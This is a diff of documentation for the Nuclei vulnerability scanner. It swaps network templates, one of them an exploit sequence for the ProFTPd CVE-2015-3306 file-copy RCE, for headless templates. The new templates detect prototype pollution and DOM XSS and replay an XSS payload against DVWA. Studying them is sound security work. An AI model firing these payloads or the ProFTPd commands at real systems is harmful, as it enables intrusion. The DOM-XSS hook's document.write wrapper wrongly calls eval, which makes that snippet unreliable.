@@ -1,136 +1,272 @@
-### Basic Network Request Template
+### Basic Headless Navigation Example
 
-This template connects to a network service, sends some data and reads 4 bytes from the response. Matchers are ran to identify valid response, which in this case is `PONG`.
+This template visits a URL in the headless browser and waits for it to load.
 
 ```yaml
-id: basic-network-request
+id: basic-headless-request
 
 info:
-  name: Basic Network Request
+  name: Basic Headless Request
   author: pdteam
   severity: info
 
-network:
-  - host: 
-      - "{{Hostname}}:8082"
-    inputs:
-      - data: "PING\r\n"
-    read-size: 4
-    matchers:
-      - type: word
-        part: data
-        words:
-          - "PONG"
+headless:
+  - steps: 
+    - action: navigate
+      args:
+        url: "{{BaseURL}}" 
+    - action: waitload
 ```
 
-### Basic TLS Network Request Template
+### Headless prototype pollution detection
 
-Similar to the above template, but the connection to the service is done with TLS enabled.
+The below template detects prototype pollution on pages with Nuclei headless capabilities. The code for detection is taken from [https://github.com/msrkp/PPScan](https://github.com/msrkp/PPScan). We make use of script injection capabilities of nuclei to provide reliable detection for prototype pollution.
 
 ```yaml
-id: basic-tls-network-request
+id: prototype-pollution-check
 
 info:
-  name: Basic TLS Network Request
-  author: pdteam
-  severity: info
+  name: Prototype Pollution Check
+  author: pd-team
+  severity: medium
+  reference: https://github.com/msrkp/PPScan
 
-network:
-  - host: 
-      - "tls://{{Hostname}}:8082"
-    inputs:
-      - data: "PING\r\n"
-    read-size: 4
+headless:
+  - steps:
+      - action: setheader
+        args:
+          part: response
+          key: Content-Security-Policy
+          value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
+      - action: setheader
+        args:
+          part: response
+          key: X-Frame-Options
+          value: foo
+      - action: setheader
+        args:
+          part: response
+          key: If-None-Match
+          value: foo
+      # Set the hook to override window.data for xss detection
+      - action: script
+        args:
+          hook: true
+          code: |
+            // Hooking code adapted from https://github.com/msrkp/PPScan/blob/main/scripts/content_script.js
+            (function() {window.alerts = [];
+
+            function logger(found) {
+            	window.alerts.push(found);
+            }
+
+            function check() {
+                loc = location.href;
+
+                if (loc.indexOf("e32a5ec9c99") >= 0 && loc.search("a0def12bce") == -1) {
+                    setTimeout(function() {
+                        if (Object.prototype.e32a5ec9c99 == "ddcb362f1d60") {
+                            logger(location.href);
+                        }
+                        var url = new URL(location.origin + location.pathname);
+                        url.hash = "__proto__[a0def12bce]=ddcb362f1d60&__proto__.a0def12bce=ddcb362f1d60&dummy";
+                        location = url.href;
+                    }, 5 * 1000);
+                } else if (loc.search("a0def12bce") != -1) {
+                    setTimeout(function() {
+                        if (Object.prototype.a0def12bce == "ddcb362f1d60") {
+                            logger(location.href);
+                        }
+                        window.close();
+                    }, 5 * 1000);
+                } else {
+                    var url = new URL(loc);
+                    url.searchParams.append("__proto__[e32a5ec9c99]", "ddcb362f1d60");
+                    url.searchParams.append("__proto__.e32a5ec9c99", "ddcb362f1d60");
+                    location = url.href;
+                }
+            }
+
+            window.onload = function() {
+                if (Object.prototype.e32a5ec9c99 == "ddcb362f1d60" ||  Object.prototype.a0def12bce == "ddcb362f1d60") {
+                    logger(location.href);
+                } else {
+                    check();
+                }
+            };
+
+            var timerID = setInterval(function() {
+                if (Object.prototype.e32a5ec9c99 == "ddcb362f1d60" || Object.prototype.a0def12bce == "ddcb362f1d60") {
+                    logger(location.href);
+                    clearInterval(timerID);
+                }
+            }, 5 * 1000)})();
+      - args:
+          url: "{{BaseURL}}"
+        action: navigate
+      - action: waitload
+      - action: script
+        name: alerts
+        args:
+          code: "window.alerts"
     matchers:
       - type: word
-        part: data
+        part: alerts
         words:
-          - "PONG"
+          - "__proto__"
+    extractors:
+      - type: kval
+        part: alerts
+        kval:
+          - alerts
 ```
 
-### Hex Input Network Request Template
+### DVWA XSS Reproduction With Headless Mode
 
-This template connects to a network service, sends some data encoded in hexadecimal to the server and reads 4 bytes from the response. Matchers are ran to identify valid response, which in this case is `PONG`. The match words here are encoded in Hexadecimal, using `encoding: hex` option of matchers.
-
-```yaml
-id: hex-network-request
-
-info:
-  name: Hex Input Network Request
-  author: pdteam
-  severity: info
-
-network:
-  - host: 
-      - "{{Hostname}}:8082"
-    inputs:
-      - data: "50494e47"
-        type: hex
-      - data: "\r\n"
-        
-    read-size: 4
-    matchers:
-      - type: word
-        part: data
-        encoding: hex
-        words:
-          - "504f4e47"
-```
-
-### Input Expressions in network Templates
-
-Inputs specified in network also support DSL Helper Expressions, so you can create your own complex inputs using variety of nuclei helper functions. The below template is an example of using `hex_decode` function to send decoded input over wire.
+This template logs into DVWA (Damn Vulnerable Web App) and tries to automatically reproduce a Reflected XSS, returning a match if it found that the payload was executed successfully.
 
 ```yaml
-id: input-expressions-mongodb-detect
+id: dvwa-xss-verification
 
 info:
-  name: Input Expression MongoDB Detection
+  name: DVWA Reflected XSS Verification
   author: pd-team
   severity: info
-  reference: https://github.com/orleven/Tentacle
 
-network:
-  - inputs:
-      - data: "{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}"
-    host:
-      - "{{Hostname}}:27017"
-    read-size: 2048
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}"
+        action: navigate
+      - action: waitload
+
+      # Set the hook to override window.data for xss detection
+      - action: script
+        args:
+          hook: true
+          code: "(function() { window.alert = function() { window.data = 'found' } })()"
+      - args:
+          by: x
+          value: admin
+          xpath: /html/body/div/div[2]/form/fieldset/input
+        action: text
+      - args:
+          by: x
+          value: password
+          xpath: /html/body/div/div[2]/form/fieldset/input[2]
+        action: text
+      - args:
+          by: x
+          xpath: /html/body/div/div[2]/form/fieldset/p/input
+        action: click
+      - action: waitload
+      - args:
+          by: x
+          xpath: /html/body/div/div[2]/div/ul[2]/li[11]/a
+        action: click
+      - action: waitload
+      - args:
+          by: x
+          value: '"><svg/onload=alert(1)>'
+          xpath: /html/body/div/div[3]/div/div/form/p/input
+        action: text
+      - args:
+          keys: "\r" # Press the enter key on the keyboard
+        action: keyboard
+      - action: waitload
+      - action: script
+        name: alert
+        args:
+          code: "window.data"
     matchers:
-      - type: word
+      - part: alert
+        type: word
         words:
-          - "logicalSessionTimeout"
-          - "localTime
+          - "found"
 ```
 
-### Multi-Step Network Request Templates
+### DOM XSS Detection
 
-This last example is an RCE in proFTPd which if vulnerable, allows to place arbitrary files in any directory on the server. The detection process involves a random string on each nuclei run using `{{randstr}}`, and sending multiple lines of FTP input to the vulnerable server. At the end, a successful match is detected with the presence of `Copy successful` in the response.
+This template performs detection of DOM-XSS for `window.name` source by hooking common sinks such as `eval`, `innerHTML` and `document.write`.
 
 ```yaml
-id: CVE-2015-3306
+id: window-name-domxss
 
 info:
-  name: ProFTPd RCE
+  name: window.name DOM XSS
   author: pd-team
-  severity: high
-  reference: https://github.com/t0kx/exploit-CVE-2015-3306
-  tags: cve,cve2015,ftp,rce
+  severity: medium
 
-network:
-  - inputs:
-      - data: "site cpfr /proc/self/cmdline\r\n"
-        read: 1024
-      - data: "site cpto /tmp/.{{randstr}}\r\n"
-        read: 1024
-      - data: "site cpfr /tmp/.{{randstr}}\r\n"
-        read: 1024
-      - data: "site cpto /var/www/html/{{randstr}}\r\n"
-    host:
-      - "{{Hostname}}:21"
-    read-size: 1024
+headless:
+  - steps:
+      - action: setheader
+        args:
+          part: response
+          key: Content-Security-Policy
+          value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
+      - action: script
+        args:
+          hook: true
+          code: |
+            (function() {window.alerts = [];
+
+            function logger(found) {
+            	window.alerts.push(found);
+            }
+
+            function getStackTrace () {
+              var stack;
+              try {
+                throw new Error('');
+              }
+              catch (error) {
+                stack = error.stack || '';
+              }
+              stack = stack.split('\n').map(function (line) { return line.trim(); });
+              return stack.splice(stack[0] == 'Error' ? 2 : 1);
+            }
+            window.name = "{{randstr_1}}'\"<>";
+
+            var oldEval = eval;
+            var oldDocumentWrite = document.write;
+            var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set;
+            Object.defineProperty(Element.prototype, 'innerHTML', {
+              set: function innerHTML_Setter(val) {
+                if (val.includes("{{randstr_1}}'\"<>")) {
+                  logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()});
+                }
+                return setter.call(this, val)
+              }
+            });
+            eval = function(data) {
+              if (data.includes("{{randstr_1}}'\"<>")) {
+                logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()});
+              }
+              return oldEval.apply(this, arguments);
+            };
+            document.write = function(data) {
+              if (data.includes("{{randstr_1}}'\"<>")) {
+                logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()});
+              }
+              return oldEval.apply(this, arguments);
+            };
+            })();
+      - args:
+          url: "{{BaseURL}}"
+        action: navigate
+      - action: waitload
+      - action: script
+        name: alerts
+        args:
+          code: "window.alerts"
     matchers:
       - type: word
+        part: alerts
         words:
-          - "Copy successful" 
+          - "sink:"
+    extractors:
+      - type: kval
+        part: alerts
+        kval:
+          - alerts
 ```
